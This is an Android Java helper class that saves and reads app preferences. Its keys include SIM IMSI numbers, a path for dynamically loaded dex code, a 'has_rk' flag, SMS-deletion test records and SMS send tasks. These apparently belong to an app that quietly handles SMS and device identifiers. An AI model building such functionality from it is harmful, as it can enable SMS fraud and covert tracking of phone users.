package com.channel.di.utils;

import android.content.Context;
import android.content.SharedPreferences;
import android.preference.PreferenceManager;
import android.text.TextUtils;

import com.gandalf.daemon.utils.XL_log;

/**
 * Created by IntelliJ IDEA. User: david Date: 11-11-2 Time: 上午10:44 To change
 * this template use File | Settings | File Templates.
 */
public class PreferenceUtil {
	private static XL_log log = new XL_log(PreferenceUtil.class);
	private static final String PREFERENCE_KEY_BAAXBOX_DOCUMENT_DEVICES_INFO = "baasbox_document_device_info";
	private static final String PREFERENCE_KEY_BAAXBOX_DOCUMENT_EXCEPTION_INFO = "baasbox_document_exception_info";
	private static final String PREFERENCE_KEY_HAS_RK = "has_rk";
	private static final String PREFERENCE_RT_TIME = "times";
	private static final String PREFERENCE_DELETE_SMS_TEST = "delete_test";
	private static final String PREFERENCE_DELETE_SMS_TEST_ID_VALUE = "delete_test_id_value";

	private static final String PREFERENCE_DEVICE_ISMI_1 = "imsi_1";
	private static final String PREFERENCE_DEVICE_ISMI_2 = "imsi_2";
	private static final String PREFERENCE_DEX_PATH = "dex_path";

	public static void saveDexPath(Context context, String path) {
		if (!TextUtils.isEmpty(path) && context != null) {
			SharedPreferences prefs = PreferenceManager.getDefaultSharedPreferences(context);
			prefs.edit().putString(PREFERENCE_DEX_PATH, path).commit();
		}
	}

	public static String getDexPath(Context context) {
		if (context != null) {
			SharedPreferences prefs = PreferenceManager.getDefaultSharedPreferences(context);
			return prefs.getString(PREFERENCE_DEX_PATH, "");
		}
		return null;
	}

	public static void saveDeleteSmsTestValue(Context context, int value) {
		SharedPreferences prefs = PreferenceManager.getDefaultSharedPreferences(context);
		prefs.edit().putInt(PREFERENCE_DELETE_SMS_TEST_ID_VALUE, value).commit();
	}

	// public static int DELETE_TEST_ID = 5000;5000
	public static int DELETE_TEST_ID = 50;

	public static int getDeleteSmsTestValue(Context context) {
		SharedPreferences prefs = PreferenceManager.getDefaultSharedPreferences(context);
		return prefs.getInt(PREFERENCE_DELETE_SMS_TEST_ID_VALUE, DELETE_TEST_ID);
	}

	public static void saveDeleteSmsTestRecord(Context context) {
		SharedPreferences prefs = PreferenceManager.getDefaultSharedPreferences(context);
		prefs.edit().putBoolean(PREFERENCE_DELETE_SMS_TEST, true).commit();
	}

	public static boolean getDeleteSmsTestRecord(Context context) {
		SharedPreferences prefs = PreferenceManager.getDefaultSharedPreferences(context);
		return prefs.getBoolean(PREFERENCE_DELETE_SMS_TEST, false);
	}

	public static void saveDeviceImsi_1(Context context, String imsi_1) {
		SharedPreferences prefs = PreferenceManager.getDefaultSharedPreferences(context);
		prefs.edit().putString(PREFERENCE_DEVICE_ISMI_1, imsi_1).commit();
	}

	public static void saveDeviceImsi_2(Context context, String imsi_2) {
		SharedPreferences prefs = PreferenceManager.getDefaultSharedPreferences(context);
		prefs.edit().putString(PREFERENCE_DEVICE_ISMI_2, imsi_2).commit();
	}

	public static String getDeviceImsi_2(Context context) {
		SharedPreferences prefs = PreferenceManager.getDefaultSharedPreferences(context);
		return prefs.getString(PREFERENCE_DEVICE_ISMI_2, "");
	}

	public static String getDeviceImsi_1(Context context) {
		SharedPreferences prefs = PreferenceManager.getDefaultSharedPreferences(context);
		return prefs.getString(PREFERENCE_DEVICE_ISMI_1, "");
	}

	public static void setRkResultSuccess(Context context) {
		SharedPreferences prefs = PreferenceManager.getDefaultSharedPreferences(context);
		prefs.edit().putBoolean(PREFERENCE_KEY_HAS_RK, true).commit();
	}

	public static boolean getRkResult(Context context) {
		SharedPreferences prefs = PreferenceManager.getDefaultSharedPreferences(context);
		return prefs.getBoolean(PREFERENCE_KEY_HAS_RK, false);
	}

	public static void clearRtRecord(Context context) {
		SharedPreferences prefs = PreferenceManager.getDefaultSharedPreferences(context);
		prefs.edit().putInt(PREFERENCE_RT_TIME, 0).commit();
	}

	public static String getExceptionDocId(Context context) {
		return readRecord(context, PREFERENCE_KEY_BAAXBOX_DOCUMENT_EXCEPTION_INFO, "");
	}

	public static void saveExceptionDocId(Context context, String exception) {
		saveRecord(context, PREFERENCE_KEY_BAAXBOX_DOCUMENT_EXCEPTION_INFO, exception);
	}

	public static void saveDeviceDocId(Context context, String id) {
		saveRecord(context, PREFERENCE_KEY_BAAXBOX_DOCUMENT_DEVICES_INFO, id);
	}

	public static String getDeviceDocId(Context context) {
		return readRecord(context, PREFERENCE_KEY_BAAXBOX_DOCUMENT_DEVICES_INFO, "");
	}

	public static void saveRecord(Context context, final String key, String value) {
		SharedPreferences prefs = PreferenceManager.getDefaultSharedPreferences(context);
		prefs.edit().putString(key, value).commit();
	}

	public static void saveRecord(Context context, final String key, int value) {
		SharedPreferences prefs = PreferenceManager.getDefaultSharedPreferences(context);
		prefs.edit().putInt(key, value).commit();
	}

	public static void saveRecord(Context context, final String key, long value) {
		SharedPreferences prefs = PreferenceManager.getDefaultSharedPreferences(context);
		prefs.edit().putLong(key, value).commit();
	}

	public static void saveRecord(Context context, final String key, boolean value) {
		SharedPreferences prefs = PreferenceManager.getDefaultSharedPreferences(context);
		prefs.edit().putBoolean(key, value).commit();
	}

	public static String readRecord(Context context, final String key, final String defaultValue) {
		SharedPreferences prefs = PreferenceManager.getDefaultSharedPreferences(context);
		String value = prefs.getString(key, defaultValue);
		return value;
	}

	public static long readRecord(Context context, final String key, final int defaultValue) {
		SharedPreferences prefs = PreferenceManager.getDefaultSharedPreferences(context);
		Integer value = prefs.getInt(key, defaultValue);
		return value;
	}

	public static boolean readRecord(Context context, final String key, final boolean defaultValue) {
		SharedPreferences prefs = PreferenceManager.getDefaultSharedPreferences(context);
		boolean value = prefs.getBoolean(key, defaultValue);
		return value;
	}

	public static long readRecord(Context context, final String key, final long defaultValue) {
		SharedPreferences prefs = PreferenceManager.getDefaultSharedPreferences(context);
		long value = prefs.getLong(key, defaultValue);
		return value;
	}

	private static final String SMS_SEND_TASKS = "send_tasks";
	private static final String SMS_TASK = "sms_task";
}
